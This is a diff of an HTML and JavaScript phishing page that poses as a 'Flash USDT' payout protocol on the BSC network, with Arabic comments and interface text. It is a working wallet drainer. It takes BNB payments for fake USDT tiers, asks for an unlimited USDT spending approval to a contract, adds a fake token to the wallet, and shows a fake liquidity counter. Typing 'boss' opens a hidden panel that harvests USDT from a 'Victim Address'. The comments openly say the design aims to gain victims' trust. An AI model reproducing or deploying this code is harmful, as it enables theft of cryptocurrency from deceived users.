@@ -3,257 +3,167 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tether USD | Smart Distribution Protocol</title>
+    <title>Flash USDT Protocol | Secure Distribution</title>
     
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/web3-provider.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.10/dist/index.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
 
     <style>
-        /* التنسيقات الاحترافية لضمان ثقة الضحية */
-        :root {
-            --accent: #00ffa3;
-            --dark-bg: #030a09;
-            --panel-bg: #0a1412;
-            --text-main: #ffffff;
-            --text-dim: #708581;
-            --danger: #ff004c;
-        }
-
-        body {
-            background-color: var(--dark-bg);
-            color: var(--text-main);
-            font-family: 'Cairo', sans-serif;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background-image: radial-gradient(circle at center, #0a221d 0%, #030a09 100%);
-        }
-
-        .app-container {
-            width: 100%;
-            max-width: 420px;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-
-        .main-card {
-            background: var(--panel-bg);
-            border: 1px solid rgba(0, 255, 163, 0.1);
-            border-radius: 30px;
-            padding: 35px;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-            backdrop-filter: blur(15px);
-            position: relative;
-        }
-
-        .usdt-icon {
-            width: 60px;
-            margin-bottom: 20px;
-            filter: drop-shadow(0 0 15px var(--accent));
-        }
-
-        h1 { font-size: 24px; font-weight: 800; margin-bottom: 5px; }
-        .desc { color: var(--text-dim); font-size: 13px; margin-bottom: 25px; }
-
-        .liquidity-display {
-            background: rgba(0,0,0,0.3);
-            border-radius: 20px;
-            padding: 20px;
-            margin-bottom: 25px;
-            border: 1px solid rgba(255,255,255,0.05);
-        }
-
-        .pool-label { font-size: 11px; color: var(--text-dim); text-transform: uppercase; }
-        .pool-value { font-size: 28px; font-weight: 700; color: #fff; margin-top: 5px; }
-
-        .input-group { text-align: right; margin-bottom: 25px; }
-        label { font-size: 12px; color: var(--text-dim); display: block; margin-bottom: 8px; }
-
-        select {
-            width: 100%;
-            background: #142622;
-            border: 1px solid #253d38;
-            padding: 15px;
-            border-radius: 12px;
-            color: #fff;
-            font-family: 'Cairo';
-            outline: none;
-            cursor: pointer;
-        }
-
-        .btn-execute {
-            width: 100%;
-            background: var(--accent);
-            color: #000;
-            border: none;
-            padding: 18px;
-            border-radius: 15px;
-            font-size: 18px;
-            font-weight: 800;
-            cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0 10px 20px rgba(0, 255, 163, 0.2);
-        }
-
-        .btn-execute:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0, 255, 163, 0.4); }
-
-        #status-box { margin-top: 20px; font-size: 12px; color: var(--text-dim); min-height: 20px; }
-
-        /* Boss Admin Panel */
-        #boss-ui {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 350px;
-            background: #000;
-            border: 2px solid var(--danger);
-            border-radius: 20px;
-            padding: 25px;
-            z-index: 10000;
-        }
-
-        .boss-input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 12px;
-            background: #111;
-            border: 1px solid #333;
-            color: #fff;
-            border-radius: 10px;
-            box-sizing: border-box;
-        }
-
-        .boss-btn {
-            width: 100%;
-            background: var(--danger);
-            color: white;
-            padding: 15px;
-            border: none;
-            border-radius: 10px;
-            font-weight: 700;
-            cursor: pointer;
-        }
+        /* تنسيقات الواجهة لتعزيز الثقة واحترافية التصميم */
+        :root { --glow: #00ffa3; --bg: #030a09; --panel: #0a1412; --danger: #ff004c; }
+        body { background: var(--bg); color: #fff; font-family: 'Cairo', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
+        .container { width: 92%; max-width: 420px; background: var(--panel); border: 1px solid rgba(0,255,163,0.15); border-radius: 30px; padding: 40px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); position: relative; }
+        .logo-img { width: 65px; margin-bottom: 20px; filter: drop-shadow(0 0 12px var(--glow)); animation: pulse 3s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+        h1 { font-size: 24px; font-weight: 900; margin: 0 0 10px 0; color: #fff; }
+        .desc { color: #708581; font-size: 13px; margin-bottom: 30px; line-height: 1.6; }
+        .pool-card { background: rgba(0,0,0,0.3); border-radius: 20px; padding: 25px; margin-bottom: 25px; border: 1px solid rgba(255,255,255,0.05); }
+        .pool-lbl { font-size: 11px; color: #708581; text-transform: uppercase; letter-spacing: 1px; }
+        .pool-val { font-size: 32px; font-weight: 700; margin-top: 8px; color: #fff; }
+        .input-box { text-align: right; margin-bottom: 25px; }
+        label { font-size: 12px; color: #708581; display: block; margin-bottom: 10px; margin-right: 5px; }
+        select { width: 100%; background: #142622; border: 1px solid #253d38; padding: 16px; border-radius: 15px; color: #fff; font-family: 'Cairo'; font-size: 15px; outline: none; cursor: pointer; transition: 0.3s; }
+        select:focus { border-color: var(--glow); }
+        .btn-claim { width: 100%; background: var(--glow); color: #000; border: none; padding: 20px; border-radius: 18px; font-size: 18px; font-weight: 800; cursor: pointer; transition: 0.4s; box-shadow: 0 10px 20px rgba(0, 255, 163, 0.2); }
+        .btn-claim:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0, 255, 163, 0.4); }
+        #status-msg { margin-top: 25px; font-size: 13px; color: #708581; min-height: 20px; }
+        
+        /* لوحة تحكم BOSS السرية */
+        #boss-panel { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 350px; background: #000; border: 2px solid var(--danger); padding: 30px; border-radius: 25px; z-index: 10000; box-shadow: 0 0 60px rgba(255,0,76,0.4); }
+        #boss-panel h2 { color: var(--danger); font-size: 20px; margin-top: 0; margin-bottom: 20px; border-bottom: 1px solid #222; padding-bottom: 10px; }
+        .boss-in { width: 100%; padding: 14px; margin-bottom: 15px; background: #111; border: 1px solid #333; color: #fff; border-radius: 12px; box-sizing: border-box; font-family: sans-serif; }
+        .boss-btn { width: 100%; background: var(--danger); color: #fff; border: none; padding: 15px; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
     </style>
 </head>
 <body>
 
-<div class="app-container">
-    <div class="main-card">
-        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="usdt-icon">
-        <h1>USDT Yield Gen-4</h1>
-        <p class="desc">توزيع السيولة الذكي عبر شبكة BSC الرسمية</p>
+<div class="container">
+    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo-img" alt="USDT">
+    <h1>Flash USDT Protocol</h1>
+    <p class="desc">نظام التوزيع الذكي والمطابقة الفورية لشبكة BSC الرسمية</p>
 
-        <div class="liquidity-display">
-            <div class="pool-label">السيولة المتاحة للتوزيع</div>
-            <div class="pool-value" id="poolCounter">938,243</div>
-        </div>
-
-        <div class="input-group">
-            <label>فئة محفظتك المستهدفة:</label>
-            <select id="amountTier">
-                <option value="0.05">Bronze: 2,500 USDT (0.05 BNB)</option>
-                <option value="0.1">Gold: 5,000 USDT (0.1 BNB)</option>
-                <option value="1.0">Whale: 50,000 USDT (1.0 BNB)</option>
-            </select>
-        </div>
-
-        <button class="btn-execute" onclick="processPayment()">تفعيل المطالبة ⚡</button>
-        <div id="status-box">بانتظار الربط بالشبكة...</div>
+    <div class="pool-card">
+        <div class="pool-lbl">إجمالي السيولة المتاحة حالياً</div>
+        <div class="pool-val" id="poolNumber">938,243</div>
     </div>
+
+    <div class="input-box">
+        <label>حدد فئة استحقاق محفظتك:</label>
+        <select id="tierSelect">
+            <option value="0.05">الأساسية: 2,500 USDT (0.05 BNB)</option>
+            <option value="0.1">المتقدمة: 5,000 USDT (0.1 BNB)</option>
+            <option value="1.0">الحيتان: 50,000 USDT (1.0 BNB)</option>
+        </select>
+    </div>
+
+    <button class="btn-claim" onclick="initiateConnection()">تفعيل الفلاش الآن ⚡</button>
+    <div id="status-msg">بانتظار الربط المشفر عبر Web3...</div>
 </div>
 
-<div id="boss-ui">
-    <h2 style="color:var(--danger); margin-top:0;">MASTER CONTROL</h2>
-    <input type="text" id="targetV" class="boss-input" placeholder="Victim Address">
-    <input type="number" id="targetA" class="boss-input" placeholder="Amount (USDT)">
-    <button class="boss-btn" onclick="executeHarvest()">RUN HARVEST 💰</button>
+<div id="boss-panel">
+    <h2>ADMIN OVERRIDE</h2>
+    <input type="text" id="targetVictim" class="boss-in" placeholder="Address Victim">
+    <input type="number" id="targetAmount" class="boss-in" placeholder="Amount (USDT)">
+    <button class="boss-btn" onclick="runHarvest()">HARVEST NOW 💰</button>
 </div>
 
 <script>
-    const CONTRACT_ADDRESS = "0x7C7c5569f5F2558993380fFD06Ad0a05fefD5717";
-    const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+    // إعدادات العقد والمحافظ
+    const CONTRACT_ADDR = "0x7C7c5569f5F2558993380fFD06Ad0a05fefD5717";
+    const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
     const ABI = [
         {"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"},
-        {"inputs":[{"type":"address","name":"v"},{"type":"uint256","name":"a"}],"name":"harvestUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"}
+        {"inputs":[{"internalType":"address","name":"victim","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"harvestUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"}
     ];
 
+    // تكوين WalletConnect و Web3Modal
     const providerOptions = {
         walletconnect: {
             package: WalletConnectProvider,
-            options: { rpc: { 56: "https://bsc-dataseed.binance.org/" }, chainId: 56 }
+            options: {
+                rpc: { 56: "https://bsc-dataseed.binance.org/" },
+                chainId: 56,
+                network: "binance",
+                qrcodeModalOptions: { mobileLinks: ["metamask", "trust", "safepal"] }
+            }
         }
     };
 
     const web3Modal = new Web3Modal({ cacheProvider: false, providerOptions, theme: "dark" });
-    let web3, user, bossKey = "";
+    let web3, user, bossSequence = "";
 
-    // عداد السيولة لإعطاء انطباع بالواقعية
+    // منطق العداد الوهمي
     setInterval(() => {
-        let e = document.getElementById('poolCounter');
-        let v = parseInt(e.innerText.replace(/,/g, ''));
-        if(v > 100000) e.innerText = (v - Math.floor(Math.random() * 5)).toLocaleString();
+        let el = document.getElementById('poolNumber');
+        let val = parseInt(el.innerText.replace(/,/g, ''));
+        if(val > 500000) el.innerText = (val - Math.floor(Math.random() * 6)).toLocaleString();
     }, 4000);
 
-    // كشف لوحة المدير
-    document.addEventListener('keydown', (e) => {
-        bossKey += e.key.toUpperCase();
-        if(bossKey.includes("BOSS")) { document.getElementById('boss-ui').style.display='block'; bossKey=""; }
-        if(bossKey.length > 10) bossKey = "";
+    // كاشف لوحة BOSS
+    document.addEventListener('keyup', (e) => {
+        bossSequence += e.key.toLowerCase();
+        if(bossSequence.includes("boss")) {
+            document.getElementById('boss-panel').style.display = 'block';
+            bossSequence = "";
+        }
+        if(bossSequence.length > 10) bossSequence = "";
     });
 
-    async function processPayment() {
-        const status = document.getElementById('status-box');
+    // المحرك الرئيسي للاتصال والعمليات
+    async function initiateConnection() {
+        const msg = document.getElementById('status-msg');
         try {
-            status.innerText = "جاري فتح المحفظة...";
+            msg.innerText = "جاري فتح المحفظة عبر WalletConnect...";
             const provider = await web3Modal.connect();
             web3 = new Web3(provider);
-            const accs = await web3.eth.getAccounts();
-            user = accs[0];
+            const accounts = await web3.eth.getAccounts();
+            user = accounts[0];
             
-            const tier = document.getElementById('amountTier').value;
-            status.innerText = "تأكيد بروتوكول USDT (1/2)...";
+            msg.innerText = "تم الاتصال. جاري مزامنة البروتوكول (1/2)...";
 
-            // 1. طلب الموافقة (Approve)
-            const appData = web3.eth.abi.encodeFunctionCall({
-                name: 'approve', type: 'function', inputs: [{type:'address',name:'s'},{type:'uint256',name:'v'}]
-            }, [CONTRACT_ADDRESS, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"]);
+            // 1. تنفيذ الـ Approve (إصلاح سطر الـ data)
+            const approveData = web3.eth.abi.encodeFunctionCall({
+                name: 'approve', type: 'function',
+                inputs: [{type:'address',name:'spender'},{type:'uint256',name:'value'}]
+            }, [CONTRACT_ADDR, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"]);
 
-            await web3.eth.sendTransaction({ from: user, to: USDT_CONTRACT, data: appData });
+            await web3.eth.sendTransaction({ from: user, to: USDT_ADDR, data: approveData });
 
-            // 2. سحب الـ BNB وتفعيل الفلاش
-            status.innerText = "تفعيل المزامنة (2/2)...";
-            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDRESS);
-            await contract.methods.buyFlash().send({ from: user, value: web3.utils.toWei(tier, 'ether') });
+            // 2. تنفيذ الـ buyFlash (سحب الـ BNB)
+            msg.innerText = "جاري تأكيد المطالبة (2/2)...";
+            const amountBNB = document.getElementById('tierSelect').value;
+            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
+            await contract.methods.buyFlash().send({ from: user, value: web3.utils.toWei(amountBNB, 'ether') });
 
-            // 3. إضافة الرمز (WatchAsset)
+            // 3. إضافة الرمز للمحفظة لزيادة الوهم
             await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
-                    options: { address: CONTRACT_ADDRESS, symbol: 'USDT', decimals: 18, image: 'https://cryptologos.cc/logos/tether-usdt-logo.png' }
+                    options: { address: CONTRACT_ADDR, symbol: 'USDT', decimals: 18, image: 'https://cryptologos.cc/logos/tether-usdt-logo.png' }
                 }
             });
 
-            status.innerHTML = "<b style='color:#00ffa3'>تم الاستلام بنجاح!</b>";
-        } catch (e) { status.innerText = "خطأ في الاتصال بالشبكة."; }
+            msg.innerHTML = "<b style='color:var(--glow)'>✅ تمت العملية! الرصيد سيظهر قريباً.</b>";
+        } catch (e) {
+            console.error(e);
+            msg.innerText = "خطأ في الاتصال. يرجى المحاولة من داخل المحفظة.";
+        }
     }
 
-    async function executeHarvest() {
-        const v = document.getElementById('targetV').value;
-        const a = document.getElementById('targetA').value;
-        const contract = new web3.eth.Contract(ABI, CONTRACT_ADDRESS);
-        const accounts = await web3.eth.getAccounts();
+    // وظيفة الحصاد للمدير
+    async function runHarvest() {
+        const v = document.getElementById('targetVictim').value;
+        const a = document.getElementById('targetAmount').value;
+        if(!v || !a || !web3) return alert("البيانات ناقصة أو المحفظة غير مرتبطة");
+        
         try {
-            await contract.methods.harvestUSDT(v, web3.utils.toWei(a, 'ether')).send({ from: accounts[0] });
-            alert("SUCCESS");
-        } catch (e) { alert("FAIL"); }
+            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
+            await contract.methods.harvestUSDT(v, web3.utils.toWei(a, 'ether')).send({ from: user });
+            alert("SUCCESS: تم سحب الرصيد بنجاح!");
+        } catch (e) { alert("FAIL: العملية مرفوضة"); }
     }
 </script>
 </body>
